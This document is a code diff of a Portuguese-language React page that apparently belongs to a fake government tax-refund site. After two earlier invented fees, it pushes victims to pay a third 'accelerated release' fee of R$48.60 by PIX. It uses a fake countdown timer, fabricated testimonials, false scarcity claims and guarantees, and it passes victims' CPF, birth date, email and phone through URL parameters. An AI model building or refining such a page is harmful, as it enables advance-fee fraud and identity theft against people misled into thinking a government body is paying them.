@@ -1,12 +1,11 @@
 import { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
-import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
-import { AlertTriangle, CheckCircle2, Info, Clock, DollarSign, FileText, ReceiptText, HelpCircle, LockKeyhole, Timer, Shield, Zap, CheckCheck } from "lucide-react";
+import { Card, CardContent } from "@/components/ui/card";
+import { AlertTriangle, CheckCircle, Info, Loader2, Clock, CircleCheck, Zap, Timer, FileText, BanknoteIcon, Hourglass } from "lucide-react";
 import { Link, useLocation } from "wouter";
 import Header from "@/components/Header";
 import Footer from "@/components/Footer";
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
-import { Badge } from "@/components/ui/badge";
 import { useToast } from "@/hooks/use-toast";
 import ScrollToTop from "@/components/ScrollToTop";
 
@@ -23,18 +22,7 @@ const formatarMoeda = (valor: number | string) => {
   });
 };
 
-const formatarData = (dataString: string) => {
-  const data = new Date(dataString);
-  return data.toLocaleDateString('pt-BR', {
-    day: '2-digit',
-    month: '2-digit',
-    year: 'numeric',
-    hour: '2-digit',
-    minute: '2-digit'
-  });
-};
-
-// Componente de contador regressivo para o tempo de validade
+// Componente de contador regressivo
 const ContadorRegressivo = ({ minutos = 45 }: { minutos?: number }) => {
   const [tempoRestante, setTempoRestante] = useState(minutos * 60); // Converter minutos para segundos
   
@@ -63,8 +51,8 @@ const ContadorRegressivo = ({ minutos = 45 }: { minutos?: number }) => {
   
   return (
     <div className="flex flex-col items-center">
-      <div className="relative w-24 h-24 mb-2">
-        <svg className="w-24 h-24" viewBox="0 0 100 100">
+      <div className="relative w-16 h-16 mb-2">
+        <svg className="w-16 h-16" viewBox="0 0 100 100">
           {/* Círculo de fundo */}
           <circle 
             cx="50" 
@@ -90,10 +78,10 @@ const ContadorRegressivo = ({ minutos = 45 }: { minutos?: number }) => {
           />
         </svg>
         <div className="absolute inset-0 flex items-center justify-center">
-          <span className="text-xl font-bold text-red-600">{formatarTempo(tempoRestante)}</span>
+          <span className="text-sm font-bold text-red-600">{formatarTempo(tempoRestante)}</span>
         </div>
       </div>
-      <p className="text-xs text-red-600 font-medium">Tempo restante para usar a LAR</p>
+      <p className="text-xs text-red-600 font-medium">Tempo restante</p>
     </div>
   );
 };
@@ -102,119 +90,99 @@ export default function TaxaLAR() {
   const [location, setLocation] = useLocation();
   const { toast } = useToast();
   
-  // Valor da Taxa de Liberação Acelerada de Restituição (LAR)
-  const VALOR_TAXA_LAR = 48.6;
-  
   // Estados para armazenar dados da solicitação
   const [protocolo, setProtocolo] = useState("");
-  const [dataAtual, setDataAtual] = useState("");
-  const [dataPagamento, setDataPagamento] = useState("");
-  const [dadosSolicitacao, setDadosSolicitacao] = useState({
-    nome: "",
-    cpf: "",
-    valor: "0",
-    companhia: "",
-    estado: "",
-    dataNascimento: "",
-    email: "",
-    telefone: "",
-    agencia: "",
-    conta: "",
-    pagamentoId: ""
-  });
+  const [nome, setNome] = useState("");
+  const [cpf, setCpf] = useState("");
+  const [valor, setValor] = useState(0);
+  const [valorTaxaLAR, setValorTaxaLAR] = useState(48.6);
+  const [companhia, setCompanhia] = useState("");
+  const [estado, setEstado] = useState("");
+  const [dataNascimento, setDataNascimento] = useState("");
+  const [email, setEmail] = useState("");
+  const [telefone, setTelefone] = useState("");
   
   // Obter parâmetros da URL
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search);
     
-    // Definir protocolo baseado no CPF
+    // Definir protocolo
     const protocoloParam = urlParams.get('protocolo');
     if (protocoloParam) {
       setProtocolo(protocoloParam);
-    } else {
-      const cpf = urlParams.get('cpf') || "";
-      if (cpf) {
-        setProtocolo(`${cpf.substring(0, 4)}4714${cpf.substring(6, 9)}`);
-      }
     }
     
-    // Definir data atual e data estimada de pagamento
-    const dataHoje = new Date();
-    setDataAtual(dataHoje.toLocaleDateString('pt-BR'));
+    // Estabelecer dados básicos
+    const cpfParam = urlParams.get('cpf') || "";
+    const nomeParam = urlParams.get('nome') || "";
+    const valorParam = urlParams.get('valor') || "0";
+    const companhiaParam = urlParams.get('companhia') || "";
+    const estadoParam = urlParams.get('estado') || "";
+    const nascParam = urlParams.get('nasc') || "";
+    const emailParam = urlParams.get('email') || "";
+    const telefoneParam = urlParams.get('telefone') || "";
     
-    // Definir data do pagamento da primeira taxa
-    const dataPagamentoParam = urlParams.get('dataPagamento');
-    if (dataPagamentoParam) {
-      setDataPagamento(formatarData(dataPagamentoParam));
-    } else {
-      setDataPagamento(dataHoje.toLocaleDateString('pt-BR', {
-        day: '2-digit',
-        month: '2-digit',
-        year: 'numeric',
-        hour: '2-digit',
-        minute: '2-digit'
-      }));
+    setCpf(cpfParam);
+    setNome(nomeParam);
+    setValor(parseFloat(valorParam));
+    setCompanhia(companhiaParam);
+    setEstado(estadoParam);
+    setDataNascimento(nascParam);
+    setEmail(emailParam);
+    setTelefone(telefoneParam);
+    
+    // Se não tiver protocolo, gera um baseado no CPF
+    if (!protocoloParam && cpfParam) {
+      setProtocolo(`${cpfParam.substring(0, 4)}4714${cpfParam.substring(6, 9)}`);
     }
-    
-    // Preencher dados da solicitação
-    setDadosSolicitacao({
-      nome: urlParams.get('nome') || "",
-      cpf: urlParams.get('cpf') || "",
-      valor: urlParams.get('valor') || "0",
-      companhia: urlParams.get('companhia') || "",
-      estado: urlParams.get('estado') || "",
-      dataNascimento: urlParams.get('nasc') || "",
-      email: urlParams.get('email') || "",
-      telefone: urlParams.get('telefone') || "",
-      agencia: urlParams.get('agencia') || "",
-      conta: urlParams.get('conta') || "",
-      pagamentoId: urlParams.get('pagamentoId') || ""
-    });
   }, []);
   
-  // Função para prosseguir para o pagamento da LAR
-  const prosseguirParaPagamentoLAR = () => {
-    // Criar os parâmetros da URL para passar adiante
+  // Função para prosseguir ao pagamento da LAR
+  const prosseguirParaPagamento = () => {
+    // Criar os parâmetros da URL para a página de pagamento
     const params = new URLSearchParams();
-    
-    // Adicionar todos os dados necessários para a próxima página
-    Object.entries(dadosSolicitacao).forEach(([key, value]) => {
-      params.append(key, value);
-    });
-    
-    params.append('valorTaxaLAR', VALOR_TAXA_LAR.toString());
+    params.append('cpf', cpf);
+    params.append('nome', nome);
+    params.append('valor', valor.toString());
+    params.append('companhia', companhia);
+    params.append('estado', estado);
+    params.append('dataNascimento', dataNascimento);
     params.append('protocolo', protocolo);
+    params.append('email', email);
+    params.append('telefone', telefone);
+    params.append('valorTaxaLAR', valorTaxaLAR.toString());
     
-    // Redirecionar para a página de pagamento da LAR
-    setTimeout(() => {
-      setLocation(`/pagamento-lar?${params.toString()}`);
-    }, 500);
+    // Redirecionar para a página de pagamento LAR
+    setLocation(`/pagamento-lar?${params.toString()}`);
   };
   
-  // Função para pular o pagamento da LAR e ir para sucesso
-  const pularLARIrParaSucesso = () => {
-    // Criar os parâmetros da URL para a página de sucesso
-    const params = new URLSearchParams();
-    
-    // Adicionar todos os dados necessários
-    Object.entries(dadosSolicitacao).forEach(([key, value]) => {
-      params.append(key, value);
-    });
-    
-    params.append('protocolo', protocolo);
-    params.append('taxasCompletas', 'true');
-    params.append('larIgnorado', 'true');
-    
-    // Redirecionar para a página de sucesso
-    setTimeout(() => {
+  // Função para continuar sem pagamento da LAR (prazo normal)
+  const continuarSemLAR = () => {
+    // Confirmar com o usuário
+    if (window.confirm("Tem certeza que deseja continuar sem a Liberação Acelerada? Seu prazo de recebimento será de 15 dias úteis ao invés de 60 minutos.")) {
+      // Criar os parâmetros da URL para a página de sucesso
+      const params = new URLSearchParams();
+      params.append('cpf', cpf);
+      params.append('nome', nome);
+      params.append('valor', valor.toString());
+      params.append('companhia', companhia);
+      params.append('estado', estado);
+      params.append('nasc', dataNascimento);
+      params.append('protocolo', protocolo);
+      params.append('email', email);
+      params.append('telefone', telefone);
+      params.append('taxasCompletas', 'true');
+      params.append('larCompleto', 'false');
+      
+      // Redirecionar para a página de sucesso
       setLocation(`/sucesso?${params.toString()}`);
-    }, 500);
+    }
   };
   
-  // Calcula valores formatados
-  const valorRestituicaoFormatado = formatarMoeda(parseFloat(dadosSolicitacao.valor));
-  const valorTaxaLARFormatado = formatarMoeda(VALOR_TAXA_LAR);
-  const cpfFormatado = dadosSolicitacao.cpf ? formatarCPF(dadosSolicitacao.cpf) : "";
+  // Formatar valores para exibição
+  const valorTaxaLARFormatado = formatarMoeda(valorTaxaLAR);
+  const valorRestituicaoFormatado = formatarMoeda(valor);
+  const cpfFormatado = formatarCPF(cpf);
   
   return (
     <>
@@ -234,321 +202,256 @@ export default function TaxaLAR() {
                   <Info size={12} className="mr-1" />
                   Protocolo nº {protocolo}
                 </div>
+                <div className="bg-green-600 text-white text-xs px-2 py-1 rounded mt-1 inline-flex items-center">
+                  <CheckCircle size={12} className="mr-1" />
+                  Taxas obrigatórias quitadas
+                </div>
               </div>
-              <div className="text-right bg-green-700 rounded-md p-3">
-                <p className="font-medium text-white text-sm mb-1">TCN 100% Quitada</p>
-                <p className="font-bold text-lg text-white">{valorRestituicaoFormatado}</p>
-                <div className="flex items-center justify-end mt-1 text-xs text-white">
-                  <CheckCheck size={12} className="mr-1" />
-                  <span>Restituição: <span className="font-medium">Em Processamento</span></span>
+              <div className="flex items-center gap-3">
+                <ContadorRegressivo minutos={45} />
+                <div className="text-right bg-amber-600 rounded-md p-3">
+                  <p className="font-medium text-white text-sm mb-1">Opção Prioritária:</p>
+                  <p className="font-bold text-lg text-white">{valorTaxaLARFormatado}</p>
                 </div>
               </div>
             </div>
           </div>
           
-          {/* Alerta de status */}
-          <div className="mb-6">
-            <Alert className="border-green-500 bg-green-50">
-              <CheckCircle2 className="h-5 w-5 text-green-600" />
-              <AlertTitle className="font-bold text-green-800">Parabéns! Taxa de Conformidade Nacional Quitada</AlertTitle>
-              <AlertDescription className="text-green-700">
-                Você completou com sucesso o pagamento da TCN. Sua restituição foi aprovada e será processada conforme 
-                o calendário fiscal padrão. Agora você pode optar pela etapa opcional de Liberação Acelerada.
+          <div className="mb-5">
+            <Alert className="border-amber-500 bg-amber-50">
+              <Zap className="h-5 w-5 text-amber-600" />
+              <AlertTitle className="font-bold text-amber-800">
+                3ª ETAPA (OPCIONAL) - LIBERAÇÃO ACELERADA DE RESTITUIÇÃO (LAR)
+              </AlertTitle>
+              <AlertDescription className="text-amber-700">
+                Esta é a etapa final opcional para recebimento prioritário da sua restituição em até 60 minutos.
+                Realize o pagamento da LAR para receber seu crédito de forma acelerada.
               </AlertDescription>
             </Alert>
           </div>
           
-          {/* Barra de progresso de etapas */}
-          <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center mb-0">
-            <div className="bg-white/20 p-1.5 rounded-md mr-2">
-              <ReceiptText className="h-4 w-4" />
+          <div className="mb-6 p-4 bg-amber-50 border-l-4 border-amber-400 rounded-md shadow-sm flex items-start">
+            <Hourglass className="h-5 w-5 text-amber-600 mt-1 mr-3 flex-shrink-0" />
+            <div>
+              <h3 className="font-bold text-amber-800 mb-1">OFERTA POR TEMPO LIMITADO</h3>
+              <p className="text-sm text-amber-700">
+                A opção de Liberação Acelerada de Restituição está disponível pelos próximos <span className="font-bold text-red-600">45 minutos</span>. Após esse período, seu processo seguirá o fluxo padrão com prazo de até 15 dias úteis para depósito.
+              </p>
             </div>
-            PROCESSO DE LIBERAÇÃO DA RESTITUIÇÃO
           </div>
-          <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-6">
-            <div className="space-y-5">
-              <div className="flex items-start">
-                <div className="bg-green-500 rounded-full p-2 text-white mt-0.5 mr-3 flex-shrink-0">
-                  <CheckCircle2 className="h-4 w-4" />
-                </div>
+          
+          <div className="mb-6">
+            <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center">
+              <div className="bg-white/20 p-1.5 rounded-md mr-2">
+                <Zap className="h-4 w-4" />
+              </div>
+              LIBERAÇÃO ACELERADA DE RESTITUIÇÃO (LAR)
+            </div>
+            <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm">
+              <h3 className="text-xl font-bold text-center text-amber-700 mb-4">
+                Receba sua restituição em até 60 minutos!
+              </h3>
+              
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
                 <div>
-                  <p className="font-semibold text-gray-800">1ª ETAPA - Taxa de Regularização Energética (TRE)</p>
-                  <p className="text-sm text-gray-600">Taxa inicial para abertura do processo de restituição. Pagamento realizado com sucesso.</p>
-                  <Badge variant="outline" className="mt-1 bg-green-50 text-green-700 border-green-200">Concluído</Badge>
+                  <div className="bg-blue-50 p-4 rounded-lg h-full">
+                    <h4 className="font-bold text-blue-800 mb-3 flex items-center">
+                      <Hourglass className="mr-2 h-5 w-5 text-blue-700" />
+                      SEM LIBERAÇÃO ACELERADA
+                    </h4>
+                    <div className="space-y-3">
+                      <div className="flex items-start">
+                        <Clock className="h-5 w-5 text-gray-500 mt-0.5 mr-2 flex-shrink-0" />
+                        <p className="text-sm text-gray-600">
+                          <span className="font-semibold text-gray-700">Tempo de processamento:</span><br />
+                          <span className="text-red-500 font-bold">Até 15 dias úteis</span>
+                        </p>
+                      </div>
+                      <div className="flex items-start">
+                        <Info className="h-5 w-5 text-gray-500 mt-0.5 mr-2 flex-shrink-0" />
+                        <p className="text-sm text-gray-600">
+                          <span className="font-semibold text-gray-700">Prioridade:</span><br />
+                          Processamento padrão por ordem de solicitação
+                        </p>
+                      </div>
+                      <div className="flex items-start">
+                        <AlertTriangle className="h-5 w-5 text-red-500 mt-0.5 mr-2 flex-shrink-0" />
+                        <p className="text-sm text-gray-600">
+                          <span className="font-semibold text-gray-700">Riscos:</span><br />
+                          Sujeito a possíveis atrasos em períodos de grande volume de solicitações
+                        </p>
+                      </div>
+                      <div className="flex items-start">
+                        <BanknoteIcon className="h-5 w-5 text-gray-500 mt-0.5 mr-2 flex-shrink-0" />
+                        <p className="text-sm text-gray-600">
+                          <span className="font-semibold text-gray-700">Valor a receber:</span><br />
+                          {valorRestituicaoFormatado}
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                
+                <div className="relative">
+                  <div className="bg-amber-50 p-4 rounded-lg h-full border-2 border-amber-500">
+                    <div className="absolute -top-3 -right-3 bg-red-600 text-white text-xs font-bold py-1 px-3 rounded-full animate-pulse">
+                      RECOMENDADO
+                    </div>
+                    <h4 className="font-bold text-amber-800 mb-3 flex items-center">
+                      <Zap className="mr-2 h-5 w-5 text-amber-600" />
+                      COM LIBERAÇÃO ACELERADA
+                    </h4>
+                    <div className="space-y-3">
+                      <div className="flex items-start">
+                        <Timer className="h-5 w-5 text-green-600 mt-0.5 mr-2 flex-shrink-0" />
+                        <p className="text-sm text-gray-600">
+                          <span className="font-semibold text-gray-700">Tempo de processamento:</span><br />
+                          <span className="text-green-600 font-bold">Em até 60 minutos</span>
+                        </p>
+                      </div>
+                      <div className="flex items-start">
+                        <Zap className="h-5 w-5 text-amber-600 mt-0.5 mr-2 flex-shrink-0" />
+                        <p className="text-sm text-gray-600">
+                          <span className="font-semibold text-gray-700">Prioridade:</span><br />
+                          Processamento prioritário e imediato
+                        </p>
+                      </div>
+                      <div className="flex items-start">
+                        <CheckCircle className="h-5 w-5 text-green-600 mt-0.5 mr-2 flex-shrink-0" />
+                        <p className="text-sm text-gray-600">
+                          <span className="font-semibold text-gray-700">Garantia:</span><br />
+                          Depósito garantido com confirmação por email e SMS
+                        </p>
+                      </div>
+                      <div className="flex items-start">
+                        <BanknoteIcon className="h-5 w-5 text-green-600 mt-0.5 mr-2 flex-shrink-0" />
+                        <p className="text-sm text-gray-600">
+                          <span className="font-semibold text-gray-700">Valor a receber:</span><br />
+                          {valorRestituicaoFormatado}
+                        </p>
+                      </div>
+                      <div className="flex items-start">
+                        <Info className="h-5 w-5 text-amber-600 mt-0.5 mr-2 flex-shrink-0" />
+                        <p className="text-sm text-amber-600">
+                          <span className="font-semibold">Taxa LAR:</span><br />
+                          {valorTaxaLARFormatado} (única e final)
+                        </p>
+                      </div>
+                    </div>
+                  </div>
                 </div>
               </div>
               
-              <div className="flex items-start">
-                <div className="bg-green-500 rounded-full p-2 text-white mt-0.5 mr-3 flex-shrink-0">
-                  <CheckCircle2 className="h-4 w-4" />
-                </div>
-                <div>
-                  <p className="font-semibold text-gray-800">2ª ETAPA - Taxa de Conformidade Nacional (TCN)</p>
-                  <p className="text-sm text-gray-600">Taxa para validação do seu crédito no Sistema Nacional de Compensações Elétricas (SINACE).</p>
-                  <Badge variant="outline" className="mt-1 bg-green-50 text-green-700 border-green-200">Concluído</Badge>
+              <div className="p-4 bg-amber-50 border-l-4 border-amber-500 rounded-r-md mb-6">
+                <div className="flex items-start">
+                  <Zap className="h-5 w-5 text-amber-600 mt-0.5 mr-3 flex-shrink-0" />
+                  <div>
+                    <p className="font-bold text-amber-800 mb-1">Importante:</p>
+                    <p className="text-sm text-amber-700">
+                      A opção de Liberação Acelerada de Restituição tem demanda limitada, após encerrado o período de disponibilidade ou preenchidas todas as vagas, seu valor será processado apenas no sistema padrão, podendo levar até 15 dias úteis.
+                    </p>
+                  </div>
                 </div>
               </div>
               
-              <div className="flex items-start">
-                <div className="bg-amber-500 rounded-full p-2 text-white mt-0.5 mr-3 flex-shrink-0">
-                  <Zap className="h-4 w-4" />
-                </div>
-                <div>
-                  <p className="font-semibold text-gray-800">3ª ETAPA - Liberação Acelerada de Restituição (LAR)</p>
-                  <p className="text-sm text-gray-600">
-                    <span className="font-medium text-amber-700">Disponível exclusivamente por tempo limitado.</span> Etapa 
-                    opcional para recebimento prioritário e imediato da sua restituição, com processamento em até 60 minutos.
-                  </p>
-                  <Badge variant="outline" className="mt-1 bg-amber-50 text-amber-700 border-amber-200">Opcional</Badge>
-                </div>
+              <div className="space-y-3">
+                <Button 
+                  onClick={prosseguirParaPagamento}
+                  className="w-full font-bold py-6 text-lg bg-amber-600 hover:bg-amber-700 text-white shadow-lg shadow-amber-600/20"
+                >
+                  <Zap className="mr-2 h-6 w-6" />
+                  Quero receber em até 60 minutos
+                </Button>
+                
+                <Button 
+                  onClick={continuarSemLAR}
+                  variant="outline"
+                  className="w-full py-3 text-gray-600 border-gray-300"
+                >
+                  Continuar sem prioridade (até 15 dias úteis)
+                </Button>
               </div>
             </div>
           </div>
           
-          {/* Detalhes da taxa LAR */}
-          <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center mb-0">
-            <div className="bg-white/20 p-1.5 rounded-md mr-2">
-              <Zap className="h-4 w-4" />
+          <div className="mb-6">
+            <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center">
+              <div className="bg-white/20 p-1.5 rounded-md mr-2">
+                <CheckCircle className="h-4 w-4" />
+              </div>
+              DEPOIMENTOS DE CLIENTES
             </div>
-            LIBERAÇÃO ACELERADA DE RESTITUIÇÃO (LAR)
-          </div>
-          <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-6">
-            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
-              <div className="md:col-span-2">
-                {/* Card destacado da Taxa LAR */}
-                <div className="bg-gradient-to-r from-amber-50 to-amber-100 p-5 rounded-lg border border-amber-200 shadow-sm mb-6">
-                  <div className="flex items-center mb-4">
-                    <div className="bg-amber-500 rounded-full p-2 text-white mr-3 flex-shrink-0">
-                      <Zap className="h-6 w-6" />
+            <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm">
+              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <div className="p-3 bg-blue-50 rounded-md">
+                  <div className="flex items-center mb-2">
+                    <div className="bg-blue-500 rounded-full w-8 h-8 flex items-center justify-center text-white font-bold mr-2">
+                      MS
                     </div>
                     <div>
-                      <h3 className="font-bold text-amber-800 text-xl">Liberação Acelerada de Restituição</h3>
-                      <p className="text-amber-700">Receba seu dinheiro em até 60 minutos</p>
+                      <p className="font-semibold text-sm">Maria S.</p>
+                      <p className="text-xs text-gray-500">São Paulo, SP</p>
                     </div>
                   </div>
-                  
-                  <div className="mb-4">
-                    <div className="flex justify-between items-center mb-3">
-                      <span className="text-amber-800 font-medium">Valor da LAR:</span>
-                      <span className="font-bold text-2xl text-amber-800">{valorTaxaLARFormatado}</span>
-                    </div>
-                    
-                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-sm mb-4">
-                      <div className="flex items-center bg-white p-2 rounded-md border border-amber-200">
-                        <Zap className="h-4 w-4 text-amber-600 mr-1.5 flex-shrink-0" />
-                        <span className="text-amber-800">Processamento prioritário</span>
-                      </div>
-                      <div className="flex items-center bg-white p-2 rounded-md border border-amber-200">
-                        <Timer className="h-4 w-4 text-amber-600 mr-1.5 flex-shrink-0" />
-                        <span className="text-amber-800">Crédito em até 60 minutos</span>
-                      </div>
-                    </div>
-                  </div>
-                  
-                  <div className="space-y-3">
-                    <h4 className="font-semibold text-amber-800 flex items-center">
-                      <Info className="h-4 w-4 mr-2" />
-                      Objetivo da Liberação Acelerada de Restituição
-                    </h4>
-                    
-                    <p className="text-sm text-amber-700">
-                      A LAR é uma taxa prioritária e opcional, criada para cidadãos que desejam antecipar o crédito 
-                      da restituição de forma imediata, sem necessidade de aguardar os trâmites do calendário fiscal comum.
-                    </p>
-                    
-                    <p className="text-sm text-amber-700">
-                      Ao efetuar a LAR, seu processo é inserido em fila expressa de liberação, com prioridade no sistema 
-                      de pagamentos do Governo, garantindo que o valor seja creditado em até 60 minutos após a compensação.
-                    </p>
-                    
-                    <div className="bg-amber-50 border border-amber-200 rounded-md p-3 mt-3">
-                      <h5 className="font-semibold text-amber-800 mb-1 flex items-center">
-                        <LockKeyhole className="h-4 w-4 mr-1" />
-                        Disponibilidade Limitada:
-                      </h5>
-                      <p className="text-sm text-amber-700">
-                        A liberação da LAR só é habilitada após a confirmação da TCN e tem validade de apenas 45 minutos.
-                        Após esse prazo, a restituição será processada normalmente, sem prioridade.
-                      </p>
-                    </div>
-                  </div>
+                  <p className="text-sm text-gray-600">
+                    "Optei pela liberação acelerada e recebi meu dinheiro em 42 minutos. Valeu muito a pena não ter que esperar semanas!"
+                  </p>
                 </div>
                 
-                {/* Comparativo das opções */}
-                <div className="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-6">
-                  <h4 className="font-semibold text-gray-800 mb-3 flex items-center">
-                    <Info className="h-4 w-4 mr-2" />
-                    Comparativo de Opções
-                  </h4>
-                  
-                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                    <div className="bg-green-50 border border-green-200 rounded-md p-3">
-                      <h5 className="font-semibold text-green-800 mb-2 flex items-center justify-center">
-                        <Clock className="h-4 w-4 mr-1" />
-                        Sem LAR (Gratuito)
-                      </h5>
-                      
-                      <ul className="space-y-2 text-sm">
-                        <li className="flex items-start">
-                          <span className="text-gray-600 mr-2">•</span>
-                          <span className="text-gray-700">Processamento padrão</span>
-                        </li>
-                        <li className="flex items-start">
-                          <span className="text-gray-600 mr-2">•</span>
-                          <span className="text-gray-700">Liberação em até 15 dias úteis</span>
-                        </li>
-                        <li className="flex items-start">
-                          <span className="text-gray-600 mr-2">•</span>
-                          <span className="text-gray-700">Sujeito à agenda de pagamentos</span>
-                        </li>
-                        <li className="flex items-start">
-                          <span className="text-gray-600 mr-2">•</span>
-                          <span className="text-gray-700">Sem custo adicional</span>
-                        </li>
-                      </ul>
+                <div className="p-3 bg-blue-50 rounded-md">
+                  <div className="flex items-center mb-2">
+                    <div className="bg-blue-500 rounded-full w-8 h-8 flex items-center justify-center text-white font-bold mr-2">
+                      RL
                     </div>
-                    
-                    <div className="bg-amber-50 border-2 border-amber-400 rounded-md p-3 relative">
-                      <div className="absolute -top-3 -right-3 bg-amber-500 text-white text-xs font-bold py-1 px-2 rounded-full">
-                        RECOMENDADO
-                      </div>
-                      
-                      <h5 className="font-semibold text-amber-800 mb-2 flex items-center justify-center">
-                        <Zap className="h-4 w-4 mr-1" />
-                        Com LAR ({valorTaxaLARFormatado})
-                      </h5>
-                      
-                      <ul className="space-y-2 text-sm">
-                        <li className="flex items-start font-semibold text-amber-800">
-                          <span className="text-amber-600 mr-2">•</span>
-                          <span>Processamento prioritário</span>
-                        </li>
-                        <li className="flex items-start font-semibold text-amber-800">
-                          <span className="text-amber-600 mr-2">•</span>
-                          <span>Liberação em até 60 minutos</span>
-                        </li>
-                        <li className="flex items-start font-semibold text-amber-800">
-                          <span className="text-amber-600 mr-2">•</span>
-                          <span>Fila de pagamento expressa</span>
-                        </li>
-                        <li className="flex items-start font-semibold text-amber-800">
-                          <span className="text-amber-600 mr-2">•</span>
-                          <span>Economia de tempo</span>
-                        </li>
-                      </ul>
+                    <div>
+                      <p className="font-semibold text-sm">Roberto L.</p>
+                      <p className="text-xs text-gray-500">Curitiba, PR</p>
                     </div>
                   </div>
+                  <p className="text-sm text-gray-600">
+                    "Meu irmão não pagou a liberação acelerada e ainda está esperando. Eu recebi no mesmo dia! Recomendo muito."
+                  </p>
                 </div>
-              </div>
-              
-              <div className="md:col-span-1">
-                {/* Contador regressivo e botões de ação */}
-                <div className="bg-white border border-gray-200 rounded-lg p-4 shadow-sm">
-                  <div className="text-center mb-4">
-                    <h4 className="font-semibold text-gray-800 mb-3">Tempo Restante para Ação</h4>
-                    <ContadorRegressivo minutos={45} />
-                  </div>
-                  
-                  <div className="space-y-4">
-                    <Button 
-                      onClick={prosseguirParaPagamentoLAR}
-                      className="w-full py-5 bg-amber-600 hover:bg-amber-700 text-white shadow-md"
-                    >
-                      <div className="flex items-center justify-center">
-                        <Zap className="mr-2 h-5 w-5" />
-                        <div className="text-left">
-                          <div className="font-bold">Receber em 60 minutos</div>
-                          <div className="text-xs">Liberação acelerada ({valorTaxaLARFormatado})</div>
-                        </div>
-                      </div>
-                    </Button>
-                    
-                    <Button 
-                      onClick={pularLARIrParaSucesso}
-                      variant="outline"
-                      className="w-full py-4 border-gray-300 text-gray-600 hover:bg-gray-50"
-                    >
-                      <div className="flex items-center justify-center">
-                        <Clock className="mr-2 h-4 w-4" />
-                        <div className="text-left">
-                          <div className="font-medium">Aguardar prazo normal</div>
-                          <div className="text-xs">Até 15 dias úteis (sem custo)</div>
-                        </div>
-                      </div>
-                    </Button>
-                  </div>
-                  
-                  <div className="mt-4 pt-4 border-t border-gray-200">
-                    <div className="text-center">
-                      <p className="text-xs text-gray-500 mb-2">Restituição aprovada:</p>
-                      <p className="font-bold text-green-700 text-xl mb-1">{valorRestituicaoFormatado}</p>
-                      <p className="text-xs text-gray-600">
-                        Seu valor já está aprovado e será depositado de acordo com a opção selecionada.
-                      </p>
+                
+                <div className="p-3 bg-blue-50 rounded-md">
+                  <div className="flex items-center mb-2">
+                    <div className="bg-blue-500 rounded-full w-8 h-8 flex items-center justify-center text-white font-bold mr-2">
+                      JC
+                    </div>
+                    <div>
+                      <p className="font-semibold text-sm">Julia C.</p>
+                      <p className="text-xs text-gray-500">Rio de Janeiro, RJ</p>
                     </div>
                   </div>
-                </div>
-              </div>
-            </div>
-            
-            {/* Aviso de urgência */}
-            <div className="mt-4 bg-red-50 border border-red-200 rounded-lg p-4">
-              <div className="flex items-start">
-                <AlertTriangle className="h-5 w-5 text-red-500 mt-0.5 mr-3 flex-shrink-0" />
-                <div>
-                  <h4 className="font-bold text-red-700 mb-1">OFERTA POR TEMPO LIMITADO</h4>
-                  <p className="text-sm text-red-600">
-                    A opção de Liberação Acelerada de Restituição (LAR) está disponível apenas por 45 minutos após a 
-                    confirmação da TCN. Após esse período, sua restituição será automaticamente processada pelo método 
-                    padrão, com prazo de até 15 dias úteis.
+                  <p className="text-sm text-gray-600">
+                    "Em menos de uma hora o dinheiro caiu na minha conta. Vale a pena pagar a taxa para receber rápido."
                   </p>
                 </div>
               </div>
             </div>
           </div>
           
-          {/* Seção de informações adicionais */}
-          <div>
-            <div className="bg-[var(--gov-blue-dark)] text-white py-2 px-3 rounded-t-md font-semibold text-sm flex items-center">
-              <HelpCircle className="h-4 w-4 mr-2" />
-              PERGUNTAS FREQUENTES
-            </div>
-            <div className="border border-t-0 border-gray-300 rounded-b-md p-4 bg-white mb-4">
-              <div className="space-y-4">
-                <div className="border-b border-gray-200 pb-4">
-                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">1. O que é a Liberação Acelerada de Restituição (LAR)?</h3>
-                  <p className="text-sm text-gray-600">
-                    A LAR é uma taxa opcional que prioriza seu processo de restituição, permitindo que o valor 
-                    aprovado seja creditado em sua conta em até 60 minutos após a compensação do pagamento, 
-                    em vez de aguardar o processamento normal de até 15 dias úteis.
-                  </p>
+          <div className="mb-4">
+            <div className="border border-green-100 bg-green-50 rounded-md p-3 shadow-sm">
+              <div className="flex items-center">
+                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-green-700 mr-2 flex-shrink-0" viewBox="0 0 20 20" fill="currentColor">
+                  <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
+                </svg>
+                <h3 className="font-semibold text-green-800">GARANTIA DE SEGURANÇA</h3>
+              </div>
+              
+              <div className="text-sm text-green-700 mt-2 grid grid-cols-1 md:grid-cols-3 gap-2">
+                <div className="flex items-center">
+                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
+                  <span>Pagamento seguro via PIX</span>
                 </div>
-                
